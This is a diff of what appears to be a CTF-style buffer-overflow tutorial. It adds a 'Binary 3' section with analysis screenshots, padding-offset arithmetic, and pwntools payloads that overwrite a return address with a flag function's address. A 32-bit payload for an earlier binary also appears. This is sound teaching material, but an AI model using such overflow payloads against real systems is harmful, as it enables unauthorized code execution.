@@ -135,10 +135,10 @@ int main(){
 
 
 
-## Your First Exploit
+## Binary 1
 
 
-### Binary
+### Binary 1
 
 ```C
 #include <stdio.h>
@@ -299,13 +299,62 @@ python2 -c 'from pwn import *; print("A"*44+p32(0xC15C0))'
 ### Binary 3
 
 
+#### Static Analysis
+
+
+![level3_bof](level3_bof.png)
+
+
+![analyzed_level3](analyzed_level3.png)
+
+
+#### Dynamic Analysis
+
+![level3_pwndbg](level3_pwndbg.png)
+
+
+#### Dynamic Analysis
+
+![calling_rdx](calling_rdx.png)
+
+
+#### Exploit Development
+
+1. K = 11th letter of the Alphabet
+2. 11*4 = 44
+3. 44-4 = 40
+4. 40 bytes is our padding
+5. 40-48 bytes is our desired value
+
+Note: 64 bits = 8 byte address
+
+
+#### Exploit Development
+
+![level3_flag_address](level3_flag_address.png)
+
+
+#### Exploit Development
+
+```Python
+from pwn import *
+padding = "A"*40
+exploit = padding + p64(0x55555555468a)
+print(exploit)
+```
+
+```Python
+python2 -c 'from pwn import *;print("A"*40+p64(0x55555555468a))'
+```
+
+
+#### Exploit
+
+![exploiting_level3](exploiting_level3.png)
 
 
 
-
-
-
-
+## Binary 4
 
 
 
